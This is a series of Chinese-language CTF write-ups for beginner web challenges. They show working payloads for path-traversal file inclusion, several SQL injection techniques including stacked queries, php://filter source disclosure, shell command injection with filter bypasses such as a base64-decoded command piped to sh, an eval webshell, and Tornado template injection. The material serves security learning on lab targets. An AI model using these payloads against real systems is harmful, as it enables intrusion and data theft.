# [HCTF 2018]WarmUp

查看源码，发现<!--source.php-->，访问，代码审计

```php
<?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];//白名单，不过滤
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }//匹配传入的参数中是否含有白名单，这里要存在白名单

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')//返回'?'在$page.'?'第一次出现的位置
            );//截取$page从0到第一个'?'
            if (in_array($_page, $whitelist)) {
                return true;
            }//$_page中要有白名单

            $_page = urldecode($page);//进行url解码
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }

    if (! empty($_REQUEST['file'])//传参file，且参数要为字符串
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?>
```

输入`payload：?file=hint.php`，得到`flag not here, and flag in ffffllllaaaagggg`，因为我们并不知道`ffffllllaaaagggg`位于哪个目录下面，所以依次尝试增加`../`，最终构造的`payload：?file=hint.php?../../../../../ffffllllaaaagggg`，这里也可以把`hint.php`换成`source.php`

# [极客大挑战 2019]EasySQL

输入`username=123 &password=123`，回显为`NO,Wrong username password！！！`

输入`username=123' &password=123`，出现语法报错，说明存在注入

继续输入,闭合单引号，构造永真的语句，`username=123' or 1=1# &password=123`，成功拿到flag

# [强网杯 2019]随便注

`1'`SQL语句报错，`1'#`正常回显，然后查询字段数，`1' order by 4#`，SQL语句报错，只有3个字段，尝试联合注入`1' union select 1,2,database()#`，回显如下

```
return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);//过滤掉的语句
```

看到`select`被过滤了，想到应该用堆叠注入绕过

查询库名，`0';show databases;#`，得到数据库有

```
string(11) "ctftraining"
string(18) "information_schema"
string(5) "mysql"
string(18) "performance_schema"
string(9) "supersqli"
string(4) "test"
```

查询表名，`0';show tables;#`，得到该数据库下的表名有

```
string(16) "1919810931114514"
string(5) "words"
```

分别查看两张表里面的内容，这里用`desc`降序获取数据表的结构，如下

```
0';desc words;#                              0';desc `1919810931114514`;# 
array(6) {                                   array(6) {
  [0]=>                                        [0]=>
  string(2) "id"                               string(4) "flag"
  [1]=>                                        [1]=>
  string(7) "int(10)"                          string(12) "varchar(100)"
  [2]=>                                        [2]=>
  string(2) "NO"                               string(2) "NO"
  [3]=>                                        [3]=>
  string(0) ""                                 string(0) ""
  [4]=>                                        [4]=>
  NULL                                         NULL
  [5]=>                                        [5]=>
  string(0) ""                                 string(0) ""
}                                            }
array(6) {
  [0]=>
  string(4) "data"
  [1]=>
  string(11) "varchar(20)"
  [2]=>
  string(2) "NO"
  [3]=>
  string(0) ""
  [4]=>
  NULL
  [5]=>
  string(0) ""
}
```

这里在查询`1919810931114514`数据表时加了反引号，是因为在windows系统下，反引号（`）是数据库、表、索引、列和别名用的引用符。

到这一步，我们可以得知，我们输入`1`，回显的应该是当前数据库下`words`这张表中的数据，所以这里的后端查询代码应该是`select id,data from words where id=`，而flag则在`1919810931114514`这张表中，这里可以用重命名换表输出，最后输入永真句`0' or 1=1#`，就能得到flag。

```
0';rename table words to word;rename table `1919810931114514` to words;alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;desc  words;#
```

看了别的师傅的WP，发现这里还可以用预处理语句，但不是很懂，涨了点知识，再学吧

# [极客大挑战 2019]Havefun

查看源码，发现以下代码，`payload：url/?cat=dog`，回显flag

```php+HTML
<!--
        $cat=$_GET['cat'];
        echo $cat;
        if($cat=='dog'){
            echo 'Syc{cat_cat_cat_cat}';
        }
        -->
```

# [SUCTF 2019]EasySQL

`1`，有回显，`1'`无回显，再闭合单引号，发现还是没有回显，应该字符型注入，用字典跑了一遍，发现过滤了`and,or,union`等语句，那就尝试了一下堆叠注入，于是得到如下结果

```
1;show databases;
Array ( [0] => 1 ) Array ( [0] => ctf ) Array ( [0] => ctftraining ) Array ( [0] => information_schema ) Array ( [0] => mysql ) Array ( [0] => performance_schema ) Array ( [0] => test )
1;show tables;
Array ( [0] => 1 ) Array ( [0] => Flag )
```

再尝试`1;desc Flag`时，发现不能查询到，显然是过滤了`flag`，这实在没什么思路了，学习别人的WP。

后端代码如下，其实这里输入`1,2,3...`的回显一样，但`0`不一样，应该是想暗示我们后端代码用了`||`

```
select $post['query']||flag from Flag
```

所以这里的目的是要能执行`||`后面的语句，最终`payload：1;set sql_mode=PIPES_AS_CONCAT;select 1`

这里`PIPES_AS_CONCAT`，将`||`视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数`concat`相类似

# [ACTF2020 新生赛]Include

点击“tips”，跳转至`http://7fcf6d87-1365-4b78-bba9-5bf97d11ffd1.node3.buuoj.cn/?file=flag.php`，回显为“Can you find out the flag?”，因为题目名称为“Include”，推测为文件包含，用`php://协议`读取文件，构造`payload：?file=php://filter/read=convert.base64-encode/resource=flag.php`，得到base64编码的字符串，解码得到flag

```php
<?php
echo "Can you find out the flag?";
//flag{b2c49a7e-a49e-4299-b9d1-c045d1b193c6}
```

# [极客大挑战 2019]Secret File

题目为“Secret File”，网页上回显得内容为“你想知道蒋璐源的秘密么？想要的话可以给你，去找吧！把一切都放在那里了！”，说明要找到一个秘密文件。

查看源码，发现一个链接`./Archive_room.php`，后面还有“Oh！You found me”，说明这就是我们要找的文件。

访问链接，看到“SECRET”的点击事件，点击跳转，回显为“查阅结束，没看清么？回去再仔细看看吧。”，显然这里存在一个重定向，用BP抓包，提示`secr3t.php`，访问该文件，得到php代码并进行代码审计

```php
<?php
    highlight_file(__FILE__);
    error_reporting(0);
    $file=$_GET['file'];
    if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
        echo "Oh no!";
        exit();
    }//对$file进行了过滤，不存在"../"，"tp"，"input"，"data"
    include($file); 
//flag放在了flag.php里
?>
```

直接访问文件，没有回显flag，然后伪协议构造`payload：secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php`，base64解码得到的字符串，在其中拿到flag

# [极客大挑战 2019]LoveSQL

老规矩，尝试`username=1' &password=1`，回显为SQL语句报错，存在注入，输入`username=1' or 1=1# &password=1`，成功登入，得到`admin`的账号密码。然后尝试用`order by`爆一下字段数，但输入`username=1' order by 1# &password=1`时，回显为未输入账号密码，后来去查了才知道，因为之前在页面上输入是`$_GET`获取的数据，会进行url编码，后来我是在url里直接输入，导致出错。

改正错误后，发现用`1`作为账号不行(应该不存在1这个账号)，于是用admin登录，`username=admin' order by 4%23`时，SQL语句报错，说明只有3个字段。

然后联合注入，爆数据库`username=1' union select 1,2,database()%23`，库名为“geek”这里用`1`是因为要让前面的查询不存在，使回显为我们控制的语句。

爆表名，表名为“geekuser,l0ve1ysq1”

```
username=1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23
```

爆列名，列名为“id,username,password”

```
username=1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database()%23
```

最后在`l0ve1ysq1`这张表`password`这一列中找到flag

```
username=1' union select 1,2,group_concat(password) from l0ve1ysq1%23
```

# [ACTF2020 新生赛]Exec

是一个命令执行的环境，需要我们Ping命令再拼接其它命令，考察多命令执行，

于是`123;ls`，只发现一个`index.php`，想要的文件不在本层目录下，于是逐层向上寻找，发现`123;ls ../../../`已是根目录，根目录下存在`flag`文件，最终`paylaod：123;cat ../../../flag`

# [GXYCTF2019]Ping Ping Ping

页面显示为`/?ip=`，尝试`url/?ip=123`，回显为`PING 123 (0.0.0.123): 56 data bytes`，联系题目名称，这是shell中Ping命令的执行返回结果，所以想到执行多条命令，

`url/?ip=123;ls`，发现存在`flag.php`，于是输入`url/?ip=123;cat flag.php`，回显为”fxck your space!“，过滤了空格，尝试用`cat<flag.php`绕过空格，回显”1fxck your symbol!“，说明不能有符号字符，尝试`cat$IFSflag.php`，回显”fxck your flag!“，说明不能有`flag`这个词，输入`cat$IFS$1index.php`得到`index.php`源码，知道过滤了哪些东西，这里我用内联执行得到flag，需要查看源码，因为被注释，不显示在网页上

```php
<?php
if(isset($_GET['ip'])){
  $ip = $_GET['ip'];
  if(preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{1f}]|\|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){//以上有一部分没有回显在网页上，查看源码可以看到
    echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
    die("fxck your symbol!");
  } else if(preg_match("/ /", $ip)){//过滤了空格
    die("fxck your space!");
  } else if(preg_match("/bash/", $ip)){
    die("fxck your bash!");
  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){//过滤了flag字符串
    die("fxck your flag!");
  }
  $a = shell_exec("ping -c 4 ".$ip);
  echo "
";
  print_r($a);
}
?>
    
payload：http://9132489d-c67f-40ae-9c5f-08f47ccd3e19.node3.buuoj.cn/?ip=123;cat$IFS`ls`
其它的解法：
拼接绕过，/?ip=123;a=g;cat$IFS$1fla$a.php;
编码绕过，/?ip=123;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh
```

# [极客大挑战 2019]Knife

“我家菜刀丢了，你能帮我找一下么，`eval($_POST["Syc"]);`”，蚁剑直连，在根目录下拿到flag

# [护网杯 2018]easy_tornado

打开网页存在三个文件，`/flag.txt`显示`flag in /fllllllllllllag`，`/welcome.txt`显示`render`，`/hints.txt`显示`md5(cookie_secret+md5(filename))`，

观察url，发现有两个参数，一个是`filename`，还有一个是`filehash`，说明要访问`/fllllllllllllag`，需要对应的hash值，而`/hints.txt`文件给出了如何求hash值，可是缺少`cookie_secret`，

直接访问`/fllllllllllllag`不加另一个参数，回显为”Error“，此时url为`url/error?msg=Error`，题目tornado是python的web框架，所以这应该是要模板注入，尝试`url/error?msg={{1}}`，回显为1，确实存在SSTI，但我实在不知道如何得知这个参数的，看WP输入`url/error?msg={{handler.settings}}`，找到`cookie_secret`，写脚本，最后传参就能得到flag

```python
import hashlib

def md5(s):
    md5 = hashlib.md5()#构造一个md5()函数对象
    md5.update(s.encode("utf8"))#添加数据
    return md5.hexdigest()#转换成16进制str类型

def filehash():
    filename = '/fllllllllllllag'
    cookie_secret = 'c1accea7-db83-46cf-afe5-fc3aee2a60b7'
    print(md5(cookie_secret + md5(filename)))

if __name__ == '__main__':
    filehash()
```

